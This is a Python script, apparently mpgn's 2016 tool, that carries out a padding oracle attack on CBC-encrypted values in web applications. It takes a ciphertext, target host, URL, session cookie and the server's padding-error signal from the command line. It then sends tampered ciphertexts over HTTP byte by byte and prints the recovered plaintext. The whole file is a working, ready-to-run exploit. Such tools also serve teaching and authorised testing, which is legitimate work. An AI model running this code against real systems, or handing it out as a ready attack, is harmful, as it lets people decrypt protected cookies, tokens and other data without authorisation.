#! /usr/bin/python

"""
    Padding Oracle Attack implementation of this article https://not.burntout.org/blog/Padding_Oracle_Attack/
    Check the readme for a full cryptographic explanation
    Author: mpgn <martial.puygrenier@gmail.com>
    Date: 2016
"""

import argparse
import http.client
import re
import sys
import time
from itertools import cycle
from urllib.parse import urlencode

#######################################
# CUSTOMIZE YOUR RESPONSE ORACLE HERE #
#######################################
""" The function you want change to adapt the result to your problem """


def test_validity(response, error):

    try:
        value = int(error)
        if int(response.status) == value:
            return 1
    except ValueError:
        pass  # it was a string, not an int.

    # oracle response with data in the DOM
    data = response.read()
    if data.find(error.encode()) == -1:
        return 1
    return 0


###################################
# CUSTOMIZE YOUR ORACLE HTTP HERE #
###################################
def call_oracle(host, cookie, url, post, method, up_cipher):
    if post:
        params = urlencode({post})
    else:
        params = urlencode({})
    headers = {
        "Content-type": "application/json",
        "Accept": "text/html",
    }
    conn = http.client.HTTPConnection(host)
    conn.request(method, url + up_cipher, params, headers)
    response = conn.getresponse()
    return conn, response


def split_len(seq, length):
    return [seq[i : i + length] for i in range(0, len(seq), length)]


""" Create custom block for the byte we search"""


def block_search_byte(size_block, i, pos, l):
    hex_char = hex(pos).split("0x")[1]
    return (
        "00" * (size_block - (i + 1))
        + ("0" if len(hex_char) % 2 != 0 else "")
        + hex_char
        + "".join(l)
    )


""" Create custom block for the padding"""


def block_padding(size_block, i):
    l = []
    for t in range(0, i + 1):
        l.append(
            ("0" if len(hex(i + 1).split("0x")[1]) % 2 != 0 else "")
            + (hex(i + 1).split("0x")[1])
        )
    return "00" * (size_block - (i + 1)) + "".join(l)


def hex_xor(s1, s2):
    b = bytearray()
    for c1, c2 in zip(bytes.fromhex(s1), cycle(bytes.fromhex(s2))):
        b.append(c1 ^ c2)
    return b.hex()


def run(cipher, size_block, host, url, cookie, method, post, error):
    cipher = cipher.upper()
    found = False
    valide_value = []
    result = []
    len_block = size_block * 2
    cipher_block = split_len(cipher, len_block)

    if len(cipher_block) == 1:
        print("[-] Abort there is only one block")
        sys.exit()
    # for each cipher_block
    for block in reversed(range(1, len(cipher_block))):
        if len(cipher_block[block]) != len_block:
            print("[-] Abort length block doesn't match the size_block")
            break
        print("[+] Search value block : ", block, "\n")
        # for each byte of the block
        for i in range(0, size_block):
            # test each byte max 255
            for ct_pos in range(0, 256):
                # 1 xor 1 = 0 or valide padding need to be checked
                if ct_pos != i + 1 or (
                    len(valide_value) > 0 and int(valide_value[-1], 16) == ct_pos
                ):

                    bk = block_search_byte(size_block, i, ct_pos, valide_value)
                    bp = cipher_block[block - 1]
                    bc = block_padding(size_block, i)

                    tmp = hex_xor(bk, bp)
                    cb = hex_xor(tmp, bc).upper()

                    up_cipher = cb + cipher_block[block]
                    # time.sleep(0.5)

                    # we call the oracle, our god
                    connection, response = call_oracle(
                        host, cookie, url, post, method, up_cipher
                    )

                    if args.verbose == True:
                        exe = re.findall("..", cb)
                        discover = ("").join(exe[size_block - i : size_block])
                        current = ("").join(exe[size_block - i - 1 : size_block - i])
                        find_me = ("").join(exe[: -i - 1])

                        sys.stdout.write(
                            "\r[+] Test [Byte %03i/256 - Block %d ]: \033[31m%s\033[33m%s\033[36m%s\033[0m"
                            % (ct_pos, block, find_me, current, discover)
                        )
                        sys.stdout.flush()

                    if test_validity(response, error):

                        found = True
                        connection.close()

                        # data analyse and insert in right order
                        value = re.findall("..", bk)
                        valide_value.insert(0, value[size_block - (i + 1)])

                        if args.verbose == True:
                            print("")
                            print("[+] HTTP ", response.status, response.reason)
                            print("[+] Block M_Byte : %s" % bk)
                            print("[+] Block C_{i-1}: %s" % bp)
                            print("[+] Block Padding: %s" % bc)
                            print("")

                        bytes_found = "".join(valide_value)
                        if (
                            i == 0
                            and int(bytes_found, 16) > size_block
                            and block == len(cipher_block) - 1
                        ):
                            print(
                                "[-] Error decryption failed the padding is > "
                                + str(size_block)
                            )
                            sys.exit()

                        print(
                            "\033[36m" + "\033[1m" + "[+]" + "\033[0m" + " Found",
                            i + 1,
                            "bytes :",
                            bytes_found,
                        )
                        print("")

                        break
            if found == False:
                # lets say padding is 01 for the last byte of the last block (the padding block)
                if len(cipher_block) - 1 == block and i == 0:
                    value = re.findall("..", bk)
                    valide_value.insert(0, "01")
                    if args.verbose == True:
                        print("")
                        print(
                            "[-] No padding found, but maybe the padding is length 01 :)"
                        )
                        print("[+] Block M_Byte : %s" % bk)
                        print("[+] Block C_{i-1}: %s" % bp)
                        print("[+] Block Padding: %s" % bc)
                        print("")
                        bytes_found = "".join(valide_value)
                else:
                    print("\n[-] Error decryption failed")
                    result.insert(0, "".join(valide_value))
                    hex_r = "".join(result)
                    print("[+] Partial Decrypted value (HEX):", hex_r.upper())
                    padding = int(hex_r[len(hex_r) - 2 : len(hex_r)], 16)
                    print(
                        "[+] Partial Decrypted value (ASCII):",
                        bytes.fromhex(hex_r[0 : -(padding * 2)]).decode(),
                    )
                    sys.exit()
            found = False

        result.insert(0, "".join(valide_value))
        valide_value = []

    print("")
    hex_r = "".join(result)
    print("[+] Decrypted value (HEX):", hex_r.upper())
    padding = int(hex_r[len(hex_r) - 2 : len(hex_r)], 16)
    print(
        "[+] Decrypted value (ASCII):",
        bytes.fromhex(hex_r[0 : -(padding * 2)]).decode(),
    )


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Exploit of Padding Oracle Attack")
    parser.add_argument(
        "-c", "--cipher", required=True, help="cipher you want to decrypt"
    )
    parser.add_argument(
        "-l",
        "--length_block_cipher",
        required=True,
        type=int,
        help="length of a block cipher: 8,16",
    )
    parser.add_argument("--host", required=True, help="url example: /page=")
    parser.add_argument("-u", "--urltarget", required=True, help="url example: /page=")
    parser.add_argument(
        "--error",
        required=True,
        help='Error that oracle give us example: 404,500,200 OR in the dom example: "<h2>Padding Error<h2>"',
    )
    parser.add_argument(
        "--cookie", help="Cookie example: PHPSESSID=9nnvje7p90b507shfmb94d7", default=""
    )
    parser.add_argument(
        "--method", help="HTTP method like POST GET default GET", default="GET"
    )
    parser.add_argument(
        "--post", help="POST data example: 'user':'value', 'pass':'value'", default=""
    )
    parser.add_argument(
        "-v",
        "--verbose",
        help="debug mode, you need a large screen",
        action="store_true",
    )
    args = parser.parse_args()

    run(
        args.cipher,
        args.length_block_cipher,
        args.host,
        args.urltarget,
        args.cookie,
        args.method,
        args.post,
        args.error,
    )